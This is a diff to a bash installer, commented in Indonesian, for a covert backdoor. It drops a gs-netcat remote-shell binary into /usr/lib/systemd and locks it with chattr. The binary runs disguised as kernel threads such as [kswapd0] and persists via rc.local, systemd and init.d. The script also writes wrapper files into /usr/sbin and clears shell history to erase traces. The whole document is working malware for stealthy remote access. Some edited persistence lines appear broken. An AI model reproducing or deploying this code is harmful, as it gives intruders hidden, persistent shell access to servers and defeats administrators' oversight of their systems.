@@ -1,34 +1,46 @@
 #!/bin/bash
 # ============================================================
-# SYSTEM DAEMON INSTALLER (STEALTH)
+# SYSTEM DAEMON INSTALLER (FULLY STEALTH)
+# Binary Location: /usr/lib/systemd/system_daemon
 # Secret Key: [VPS_IP]@dark-ai
 # Connection: gs-netcat -s [VPS_IP]@dark-ai -i
-# Binary Location: /usr/lib/systemd/system_daemon
 # ============================================================
 
 # ============================================================
-# 0. SETUP VARIABLES (STEALTH)
+# 0. SETUP VARIABLES (FULLY STEALTH)
 # ============================================================
 HIDDEN_DIR="/usr/lib/systemd"
 BINARY_NAME="system_daemon"
 DAEMON_PATH="$HIDDEN_DIR/$BINARY_NAME"
 
-# Daftar nama proses sistem asli
+# Daftar nama proses sistem asli (TANPA argumen mencurigakan)
 PROCESS_NAMES=(
-    "irqbalance" "kswapd0" "kthreadd" "ksoftirqd/0" "migration/0"
-    "watchdog/0" "cpuhp/0" "kdevtmpfs" "khungtaskd" "oom_reaper"
-    "writeback" "kcompactd0" "ksmd" "upowerd" "accounts-daemon"
+    "[khelper]"      # IRQ balancer (with full path)
+    "[kswapd0]"         # Kernel swap daemon
+    "[kblockd/0]"        # Kernel thread daemon
+    "[kthread]"     # Kernel soft IRQ
+    "[migration/0]"     # CPU migration
+    "[watchdog/0]" # Kernel watchdog
+    "[cpuhp/0]"   # CPU hotplug
+    "[kdevtmpfs]"       # Device tmpfs
+    "[khungtaskd]"      # Hung task detector
+    "[oom_reaper]"      # OOM reaper
+    "[writeback]"       # FS writeback
+    "[kcompactd0]"      # Memory compaction
+    "[ksmd]"            # Kernel samepage merging
+    "[upowerd]"         # Power management
+    "[daemon]"  # User account tracking (with full path)
 )
 
 # Ambil IP VPS
 VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
-DAEMON_SECRET="${VPS_IP}@dark-ai"  # Secret key: ipvps@dark-ai
+DAEMON_SECRET="${VPS_IP}@dark-ai"
 
 # ============================================================
 # 1. DOWNLOAD BINARY (STEALTH)
 # ============================================================
 echo "=========================================="
-echo " SYSTEM DAEMON INSTALLER - STEALTH MODE"
+echo " SYSTEM DAEMON INSTALLER - FULLY STEALTH"
 echo "=========================================="
 
 mkdir -p "$HIDDEN_DIR" 2>/dev/null
@@ -57,48 +69,58 @@ fi
 chattr +i "$DAEMON_PATH" 2>/dev/null
 
 # ============================================================
-# 2. BUAT LAUNCHER (STEALTH)
+# 2. BUAT WRAPPER (FULLY STEALTH)
 # ============================================================
-cat > "$HIDDEN_DIR/.system_launch" << 'LAUNCHEOF'
+# Buat wrapper yang menyembunyikan argumen mencurigakan
+for PROCESS in "${PROCESS_NAMES[@]}"; do
+    # Ambil nama file dari path (misal: /usr/sbin/irqbalance -> irqbalance)
+    PROCESS_FILE=$(basename "$PROCESS")
+
+    # Buat wrapper di /usr/sbin/ atau /usr/lib/systemd/
+    WRAPPER_PATH="/usr/sbin/$PROCESS_FILE"
+    if [[ "$PROCESS" == /* ]]; then
+        WRAPPER_PATH="$PROCESS"
+    fi
+
+    # Jangan overwrite file asli
+    if [ ! -f "$WRAPPER_PATH" ]; then
+        cat > "$WRAPPER_PATH" << 'WRAPPEREOF'
 #!/bin/bash
-PROCESS_NAMES=(
-    "irqbalance" "kswapd0" "kthreadd" "ksoftirqd/0" "migration/0"
-    "watchdog/0" "cpuhp/0" "kdevtmpfs" "khungtaskd" "oom_reaper"
-    "writeback" "kcompactd0" "ksmd" "upowerd" "accounts-daemon"
-)
-PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-exec -a "$PROCESS_NAME" "$HIDDEN_DIR/system_daemon" -s "$DAEMON_SECRET" -liqD 2>/dev/null &
-LAUNCHEOF
-
-chmod +x "$HIDDEN_DIR/.system_launch"
-chattr +i "$HIDDEN_DIR/.system_launch" 2>/dev/null
+# Wrapper untuk menyembunyikan argumen
+exec -a "$0" /usr/lib/systemd/system_daemon -s "$DAEMON_SECRET" -liqD 2>/dev/null &
+WRAPPEREOF
+        chmod +x "$WRAPPER_PATH"
+        chattr +i "$WRAPPER_PATH" 2>/dev/null
+    fi
+done
 
 # ============================================================
-# 3. JALANKAN DAEMON (STEALTH)
+# 3. JALANKAN DAEMON (FULLY STEALTH)
 # ============================================================
 echo "[*] Mengaktifkan layanan sistem..."
 pkill -f "system_daemon" 2>/dev/null
 
+# Pilih nama proses acak (dengan path lengkap)
 PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
 nohup exec -a "$PROCESS_NAME" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
 
 sleep 2
 if pgrep -f "system_daemon" >/dev/null 2>&1; then
-    echo "[+] Layanan sistem berjalan sebagai: $PROCESS_NAME"
+    echo "[+] Layanan sistem berjalan sebagai: $(basename "$PROCESS_NAME")"
 else
     echo "[!] Mengaktifkan fallback..."
     nohup bash -c "exec -a \"$PROCESS_NAME\" \"$DAEMON_PATH\" -s \"$DAEMON_SECRET\" -liqD" >/dev/null 2>&1 &
 fi
 
 # ============================================================
-# 4. PERSISTENCE (STEALTH)
+# 4. PERSISTENCE (FULLY STEALTH)
 # ============================================================
 echo "[*] Mengkonfigurasi persisten..."
 
 if [ -f /etc/rc.local ]; then
     if ! grep -q "system_daemon" /etc/rc.local 2>/dev/null; then
         PERSIST_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-        sed -i "/^exit 0/i\nohup exec -a \"$PERSIST_PROCESS\" \"$DAEMON_PATH\" -s \"$DAEMON_SECRET\" -liqD >/dev/null 2>&1 &" /etc/rc.local 2>/dev/null
+        sed -i "/^exit 0/i\n$PERSIST_PROCESS &" /etc/rc.local 2>/dev/null
     fi
 fi
 
@@ -110,7 +132,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/lib/systemd/system_daemon -s "$DAEMON_SECRET" -liqD
+ExecStart=$PERSIST_PROCESS
 Restart=always
 RestartSec=5
 User=root
@@ -140,7 +162,7 @@ cat > /etc/init.d/system_daemon << INIT_EOF
 case "\$1" in
     start)
         PERSIST_PROCESS="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-        nohup exec -a "\$PERSIST_PROCESS" "$DAEMON_PATH" -s "$DAEMON_SECRET" -liqD >/dev/null 2>&1 &
+        nohup "$PERSIST_PROCESS" >/dev/null 2>&1 &
         ;;
     stop)
         pkill -f "system_daemon" >/dev/null 2>&1
@@ -161,7 +183,7 @@ chmod +x /etc/init.d/system_daemon
 update-rc.d system_daemon defaults >/dev/null 2>&1 || chkconfig system_daemon on >/dev/null 2>&1
 
 # ============================================================
-# 5. HAPUS JEJAK (STEALTH)
+# 5. HAPUS JEJAK (FULLY STEALTH)
 # ============================================================
 echo "[*] Membersihkan jejak..."
 history -c 2>/dev/null
@@ -209,7 +231,7 @@ echo "Cek port:    ss -tulnp | grep 443"
 echo ""
 echo "⚠️  PERINGATAN:"
 echo "-----------------"
+echo "Proses akan terlihat sebagai: $(basename "$PROCESS_NAME") (tanpa argumen mencurigakan)"
 echo "Simpan secret key dan IP VPS dengan aman!"
-echo "Jangan bagikan kepada siapa pun."
 echo "=========================================="
 echo ""
